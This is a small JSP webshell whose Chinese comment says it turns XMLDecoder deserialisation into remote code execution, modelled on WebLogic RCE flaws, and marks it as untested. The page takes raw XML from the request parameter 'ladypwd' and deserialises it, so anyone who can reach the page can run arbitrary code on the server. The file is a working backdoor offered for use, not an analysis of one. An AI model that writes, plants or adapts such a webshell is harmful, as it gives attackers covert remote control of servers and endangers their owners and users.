<%@ page import="java.beans.XMLDecoder" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="java.io.ByteArrayInputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%--
通过XMLDecoder将恶意的xml文档反序列化(参考Weblogic的一些RCE漏洞)来实现JSP Webshell
【未测试】
--%>
<%
    String payload = request.getParameter("ladypwd");
    XMLDecoder xd = new XMLDecoder(new BufferedInputStream(new ByteArrayInputStream(payload.getBytes())));
    Object obj = xd.readObject();
%>
